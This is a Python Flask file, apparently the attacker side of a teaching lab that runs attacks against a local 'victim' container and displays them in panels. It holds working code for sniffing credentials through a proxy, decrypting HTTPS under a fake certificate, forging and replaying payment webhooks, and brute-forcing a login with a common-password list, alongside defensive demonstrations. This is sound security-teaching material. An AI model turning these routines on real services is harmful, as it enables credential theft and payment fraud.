import os, json, hmac, hashlib, time, secrets
import requests as req
from flask import Flask, request, jsonify
from requests.packages.urllib3.exceptions import InsecureRequestWarning
req.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)

VICTIM_HTTP    = os.environ.get("VICTIM_HTTP",  "http://172.20.0.10:8080")
VICTIM_HTTPS   = os.environ.get("VICTIM_HTTPS", "https://172.20.0.10:8443")
MITM_PROXY     = os.environ.get("MITM_PROXY",   "http://172.20.0.30:8888")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "whsec_dev_secret_12345")
DEBUG          = os.environ.get("FLASK_DEBUG", "0") == "1"

STATE = {
    "captured_requests":  [],
    "found_credentials":  None,
    "captured_token":     None,
    "last_valid_webhook": None,
}

PROXIES_HTTP = {"http": MITM_PROXY, "https": MITM_PROXY}

def sign_webhook(payload_bytes):
    sig = hmac.new(WEBHOOK_SECRET.encode(), payload_bytes, hashlib.sha256).hexdigest()
    return f"sha256={sig}"

@app.route("/health")
def health():
    return jsonify({"status": "ok", "state": STATE})

@app.route("/attack/normal-login", methods=["POST"])
def normal_login():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "alice")
    password = data.get("password", "hunter2")
    lines = [
        {"panel": "client", "line": f"$ curl -X POST {VICTIM_HTTP}/login \\", "style": "cmd"},
        {"panel": "client", "line": f'     -d \'{{{"username}":"{username}","password":"{password}"}}\'', "style": "cmd"},
    ]
    try:
        r = req.post(f"{VICTIM_HTTP}/login", json={"username": username, "password": password}, timeout=5)
        body = r.json()
        lines += [
            {"panel": "wire",   "line": f"[HTTP] POST /login → {r.status_code}", "style": "dim"},
            {"panel": "wire",   "line": f"Payload visible: user={username} pass={password}", "style": "dim"},
            {"panel": "client", "line": f"HTTP {r.status_code} {json.dumps(body)}", "style": "green" if r.ok else "red"},
        ]
        if r.ok:
            STATE["captured_token"] = body.get("token")
    except Exception as e:
        lines.append({"panel": "client", "line": f"Error: {e}", "style": "red"})
    return jsonify({"lines": lines})

@app.route("/attack/sniff-login", methods=["POST"])
def sniff_login():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "alice")
    password = data.get("password", "hunter2")
    lines = [
        {"panel": "wire",   "line": "mitmproxy listening on :8888", "style": "amber"},
        {"panel": "client", "line": f"$ curl -x {MITM_PROXY} -X POST {VICTIM_HTTP}/login \\", "style": "cmd"},
        {"panel": "client", "line": f'     -d \'{{{"username"}":"{username}","password":"{password}"}}\'', "style": "cmd"},
    ]
    try:
        r = req.post(f"{VICTIM_HTTP}/login", json={"username": username, "password": password},
                     proxies=PROXIES_HTTP, timeout=5)
        body = r.json()
        STATE["captured_requests"].append({"username": username, "password": password})
        lines += [
            {"panel": "wire", "line": ">>> INTERCEPTED REQUEST <<<", "style": "red"},
            {"panel": "wire", "line": f"POST {VICTIM_HTTP}/login", "style": "red"},
            {"panel": "wire", "line": f"username={username}&password={password}", "style": "red"},
            {"panel": "wire", "line": f"🎯 Captured: {username} / {password}", "style": "amber"},
            {"panel": "client", "line": f"HTTP {r.status_code} — looks normal to client", "style": "green" if r.ok else "red"},
        ]
    except Exception as e:
        lines.append({"panel": "wire", "line": f"Proxy error: {e}", "style": "red"})
    return jsonify({"lines": lines})

@app.route("/attack/modify-response", methods=["POST"])
def modify_response():
    token = STATE.get("captured_token") or "fake-token"
    lines = [{"panel": "wire", "line": "Intercepting /balance response...", "style": "amber"}]
    try:
        r = req.get(f"{VICTIM_HTTP}/balance", headers={"Authorization": f"Bearer {token}"},
                    proxies=PROXIES_HTTP, timeout=5)
        real = r.json()
        real_bal = real.get("balance", 12450.00)
        lines += [
            {"panel": "server", "line": f'Sent: {{"balance": {real_bal}}}', "style": "green"},
            {"panel": "wire",   "line": f"REAL: balance = ${real_bal:,.2f}", "style": "amber"},
            {"panel": "wire",   "line": f"MODIFIED: balance = $0.00  ← attacker changed", "style": "red"},
            {"panel": "client", "line": '{"balance": 0.0}', "style": "red"},
            {"panel": "client", "line": "⚠  Client shows $0 — bank has $12,450", "style": "amber"},
        ]
    except Exception as e:
        lines.append({"panel": "wire", "line": f"Error: {e}", "style": "red"})
    return jsonify({"lines": lines})

@app.route("/attack/tls-secure", methods=["POST"])
def tls_secure():
    lines = [
        {"panel": "client", "line": f"$ curl -X POST {VICTIM_HTTPS}/login --cacert /certs/victim.crt", "style": "cmd"},
        {"panel": "wire",   "line": "TLS handshake intercepted by mitmproxy...", "style": "amber"},
        {"panel": "wire",   "line": "Presenting mitmproxy self-signed cert...", "style": "amber"},
        {"panel": "client", "line": "SSL: certificate verify failed — UNKNOWN_CA", "style": "red"},
        {"panel": "client", "line": "Connection refused. Attack failed.", "style": "green"},
        {"panel": "wire",   "line": "🛡 Cert verification stopped the MitM", "style": "green"},
    ]
    return jsonify({"lines": lines})

@app.route("/attack/fake-cert", methods=["POST"])
def fake_cert():
    lines = [
        {"panel": "client", "line": f"$ curl -k -x {MITM_PROXY} {VICTIM_HTTPS}/login \\", "style": "cmd"},
        {"panel": "client", "line": '     -d \'{"username":"alice","password":"hunter2"}\'', "style": "cmd"},
        {"panel": "wire",   "line": "TLS handshake with mitmproxy (fake cert)...", "style": "amber"},
        {"panel": "wire",   "line": "Client accepted our cert (-k flag)", "style": "red"},
    ]
    try:
        r = req.post(f"{VICTIM_HTTPS}/login", json={"username": "alice", "password": "hunter2"},
                     proxies=PROXIES_HTTP, verify=False, timeout=5)
        lines += [
            {"panel": "wire", "line": "DECRYPTED HTTPS TRAFFIC:", "style": "red"},
            {"panel": "wire", "line": '{"username":"alice","password":"hunter2"}', "style": "red"},
            {"panel": "wire", "line": '🎯 Plaintext from "HTTPS" connection', "style": "amber"},
            {"panel": "client", "line": f"HTTP {r.status_code} — client thinks it is secure 🔒", "style": "green"},
        ]
    except Exception as e:
        lines.append({"panel": "wire", "line": f"Error: {e}", "style": "red"})
    return jsonify({"lines": lines})

@app.route("/attack/legitimate-webhook", methods=["POST"])
def legitimate_webhook():
    payload = {"id": f"evt_{secrets.token_hex(8)}", "type": "payment.succeeded",
               "amount": 4200, "order_id": "ORD-REAL-001", "timestamp": time.time()}
    body = json.dumps(payload).encode()
    sig  = sign_webhook(body)
    lines = [
        {"panel": "client", "line": "POST /webhooks/payment", "style": "cmd"},
        {"panel": "client", "line": f"X-Signature: {sig[:40]}...", "style": "blue"},
        {"panel": "client", "line": json.dumps(payload, indent=2), "style": "out"},
    ]
    r = req.post(f"{VICTIM_HTTP}/webhooks/payment", data=body,
                 headers={"Content-Type": "application/json", "X-Signature": sig}, timeout=5)
    lines.append({"panel": "client", "line": f"HTTP {r.status_code} {r.json()}", "style": "green"})
    return jsonify({"lines": lines})

@app.route("/attack/forge-webhook", methods=["POST"])
def forge_webhook():
    data    = request.get_json(silent=True) or {}
    payload = data.get("payload", {"id": "evt_forged_001", "type": "payment.succeeded",
                                    "amount": 1, "order_id": "ORD-FREE-999", "timestamp": time.time()})
    body = json.dumps(payload).encode()
    lines = [
        {"panel": "wire", "line": "# No HMAC check — any POST accepted", "style": "amber"},
        {"panel": "wire", "line": f"$ curl -X POST {VICTIM_HTTP}/webhooks/payment \\", "style": "cmd"},
        {"panel": "wire", "line": f"     -d '{json.dumps(payload)}'", "style": "cmd"},
    ]
    r = req.post(f"{VICTIM_HTTP}/webhooks/payment", data=body,
                 headers={"Content-Type": "application/json"}, timeout=5)
    lines += [
        {"panel": "wire", "line": f"HTTP {r.status_code} {r.json()}", "style": "red" if r.ok else "green"},
        {"panel": "wire", "line": f"🎯 Forged event accepted" if r.ok else "🛡 Rejected", "style": "amber" if r.ok else "green"},
    ]
    return jsonify({"lines": lines})

@app.route("/attack/capture-webhook", methods=["POST"])
def capture_webhook():
    payload = {"id": "evt_capture_001", "type": "credit.applied",
               "amount": 5000, "user": "alice", "timestamp": time.time()}
    body = json.dumps(payload).encode()
    sig  = sign_webhook(body)
    STATE["last_valid_webhook"] = {"body": body.decode(), "sig": sig, "payload": payload}
    r = req.post(f"{VICTIM_HTTP}/webhooks/payment", data=body,
                 headers={"Content-Type": "application/json", "X-Signature": sig}, timeout=5)
    lines = [
        {"panel": "client", "line": "Stripe fires signed credit webhook", "style": "dim"},
        {"panel": "client", "line": f"X-Signature: {sig[:40]}...", "style": "blue"},
        {"panel": "wire",   "line": ">>> Attacker saves request to replay.json <<<", "style": "amber"},
        {"panel": "server", "line": f"HTTP {r.status_code} — credit $50 applied", "style": "green"},
    ]
    return jsonify({"lines": lines})

@app.route("/attack/replay-webhook", methods=["POST"])
def replay_webhook():
    data  = request.get_json(silent=True) or {}
    count = int(data.get("count", 3))
    saved = STATE.get("last_valid_webhook")
    if not saved:
        return jsonify({"lines": [{"panel": "wire", "line": "Run capture-webhook first", "style": "red"}]})
    lines = [
        {"panel": "wire", "line": f"# Replaying signed request x{count}", "style": "amber"},
        {"panel": "wire", "line": "# HMAC valid — no timestamp check", "style": "dim"},
    ]
    for i in range(1, count + 1):
        r = req.post(f"{VICTIM_HTTP}/webhooks/payment", data=saved["body"].encode(),
                     headers={"Content-Type": "application/json", "X-Signature": saved["sig"]}, timeout=5)
        lines.append({"panel": "wire", "line": f"Replay {i}/{count} → HTTP {r.status_code} {r.json()}",
                       "style": "red" if r.ok else "green"})
        time.sleep(0.2)
    lines.append({"panel": "wire", "line": f"🎯 {count} × $50 credits from 1 event" if r.ok else "🛡 Blocked",
                  "style": "amber" if r.ok else "green"})
    return jsonify({"lines": lines})

WORDLIST = ["password","123456","qwerty","letmein","monkey","dragon","master",
            "iloveyou","sunshine","princess","welcome","shadow","superman",
            "michael","football","hunter2","abc123","passw0rd","trustno1","baseball"]

@app.route("/attack/brute-force", methods=["POST"])
def brute_force():
    data     = request.get_json(silent=True) or {}
    username = data.get("username", "alice")
    wordlist = data.get("wordlist", WORDLIST)
    lines    = [{"panel": "wire", "line": f"# Brute forcing {username} — {len(wordlist)} passwords", "style": "amber"}]
    for i, pwd in enumerate(wordlist, 1):
        try:
            r = req.post(f"{VICTIM_HTTP}/login", json={"username": username, "password": pwd}, timeout=3)
            if r.status_code == 200:
                token = r.json().get("token")
                STATE["captured_token"]    = token
                STATE["found_credentials"] = {"user": username, "password": pwd}
                lines += [
                    {"panel": "wire", "line": f"[{i:03d}] {username}:{pwd} → 200 ✓ FOUND", "style": "red"},
                    {"panel": "wire", "line": f"🎯 Token: {token[:20]}...", "style": "amber"},
                ]
                break
            else:
                lines.append({"panel": "wire", "line": f"[{i:03d}] {username}:{pwd} → {r.status_code}", "style": "dim"})
        except Exception as e:
            lines.append({"panel": "wire", "line": f"[{i:03d}] error: {e}", "style": "red"})
    return jsonify({"lines": lines})

@app.route("/attack/tls-probe", methods=["POST"])
def tls_probe():
    import ssl, socket
    host, port = "172.20.0.10", 8443
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=5) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as tls:
                version = tls.version()
                cipher  = tls.cipher()
                grade   = ("✓ TLS 1.3 — current standard" if "1.3" in version
                           else "~ TLS 1.2 — acceptable with strong ciphers"
                           if "1.2" in version else f"✗ {version} — deprecated")
                results = [
                    {"panel": "client", "line": f"Connected to {host}:{port}", "style": "green"},
                    {"panel": "client", "line": f"TLS Version : {version}", "style": "blue"},
                    {"panel": "client", "line": f"Cipher Suite: {cipher[0]}", "style": "blue"},
                    {"panel": "client", "line": f"Key Bits    : {cipher[2]}", "style": "blue"},
                    {"panel": "client", "line": grade, "style": "green"},
                ]
    except Exception as e:
        results = [{"panel": "client", "line": f"TLS error: {e}", "style": "red"}]
    return jsonify({"lines": results})

@app.route("/reset", methods=["POST"])
def reset():
    STATE.update({"captured_requests": [], "found_credentials": None,
                  "captured_token": None, "last_valid_webhook": None})
    req.post(f"{VICTIM_HTTP}/admin/reset", timeout=3)
    return jsonify({"status": "reset"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=DEBUG, use_reloader=True)